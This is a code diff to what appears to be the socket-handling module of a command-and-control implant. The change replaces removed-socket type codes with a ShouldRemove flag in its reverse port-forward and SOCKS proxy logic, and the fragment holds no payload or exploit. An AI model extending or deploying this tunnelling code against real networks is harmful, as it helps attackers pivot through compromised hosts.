@@ -180,17 +180,18 @@ PSOCKET_DATA SocketNew( SOCKET WinSock, DWORD Type, BOOL UseIpv4, DWORD IPv4, PB
     }
 
     /* Allocate our Socket object */
-    Socket           = NtHeapAlloc( sizeof( SOCKET_DATA ) );
-    Socket->ID       = RandomNumber32();
-    Socket->ParentID = ParentID;
-    Socket->Type     = Type;
-    Socket->IPv4     = IPv4;
-    Socket->IPv6     = IPv6;
-    Socket->LclPort  = LclPort;
-    Socket->FwdAddr  = FwdAddr;
-    Socket->FwdPort  = FwdPort;
-    Socket->Socket   = WinSock;
-    Socket->Next     = Instance.Sockets;
+    Socket               = NtHeapAlloc( sizeof( SOCKET_DATA ) );
+    Socket->ID           = RandomNumber32();
+    Socket->ParentID     = ParentID;
+    Socket->Type         = Type;
+    Socket->ShouldRemove = FALSE;
+    Socket->IPv4         = IPv4;
+    Socket->IPv6         = IPv6;
+    Socket->LclPort      = LclPort;
+    Socket->FwdAddr      = FwdAddr;
+    Socket->FwdPort      = FwdPort;
+    Socket->Socket       = WinSock;
+    Socket->Next         = Instance.Sockets;
 
     Instance.Sockets = Socket;
 
@@ -226,6 +227,11 @@ VOID SocketClients()
     {
         if ( ! Socket )
             break;
+
+        if ( Socket->ShouldRemove ) {
+            Socket = Socket->Next;
+            continue;
+        }
 
         /* Accept any connection made from the rportfwd */
         if ( Socket->Type == SOCKET_TYPE_REVERSE_PORTFWD )
@@ -293,6 +299,11 @@ VOID SocketRead()
         if ( ! Socket )
             break;
 
+        if ( Socket->ShouldRemove ) {
+            Socket = Socket->Next;
+            continue;
+        }
+
         Failed    = FALSE;
         ErrorCode = 0;
 
@@ -316,12 +327,8 @@ VOID SocketRead()
                 {
                     PRINTF( "Failed to get the read size from %x : %d\n", Socket->ID, Socket->Type )
 
-                    /* Tell the Socket remover that it can remove this one.
-                     * If the Socket type is type CLIENT then use TYPE_CLIENT_REMOVED
-                     * else use TYPE_SOCKS_REMOVED to remove a socks proxy client */
-                    Socket->Type = ( Socket->Type == SOCKET_TYPE_CLIENT ) ?
-                            SOCKET_TYPE_CLIENT_REMOVED :
-                            SOCKET_TYPE_SOCKS_REMOVED  ;
+                    /* Tell the Socket remover that it can remove this one. */
+                    Socket->ShouldRemove = TRUE;
 
                     Failed    = TRUE;
                     ErrorCode = Instance.Win32.WSAGetLastError();
@@ -425,7 +432,7 @@ VOID SocketFree( PSOCKET_DATA Socket )
     PRINTF( "Closing socket %x\n", Socket->ID )
 
     /* do we want to remove a reverse port forward client ? */
-    if ( Socket->Type == SOCKET_TYPE_CLIENT_REMOVED && Socket->ParentID == 0 )
+    if ( Socket->Type == SOCKET_TYPE_REVERSE_PORTFWD || Socket->Type == SOCKET_TYPE_CLIENT )
     {
         /* create socket response package */
         Package = PackageCreate( DEMON_COMMAND_SOCKET );
@@ -433,6 +440,7 @@ VOID SocketFree( PSOCKET_DATA Socket )
         /* socket package header */
         PackageAddInt32( Package, SOCKET_COMMAND_RPORTFWD_REMOVE );
         PackageAddInt32( Package, Socket->ID );
+        PackageAddInt32( Package, Socket->Type );
 
         /* Local Host & Port data */
         PackageAddInt32( Package, Socket->IPv4 );
@@ -448,7 +456,7 @@ VOID SocketFree( PSOCKET_DATA Socket )
     }
 
     /* do we want to remove a socks proxy client ? */
-    else if ( Socket->Type == SOCKET_TYPE_SOCKS_REMOVED )
+    else if ( Socket->Type == SOCKET_TYPE_REVERSE_PROXY )
     {
         /* create socket response package */
         Package = PackageCreate( DEMON_COMMAND_SOCKET );
@@ -490,7 +498,7 @@ VOID SocketCleanDead()
         if ( ! Socket )
             break;
 
-        if ( Socket->Type == SOCKET_TYPE_CLIENT_REMOVED || Socket->Type == SOCKET_TYPE_SOCKS_REMOVED )
+        if ( Socket->ShouldRemove )
         {
             /* we are at the beginning. */
             if ( ! SkLast )
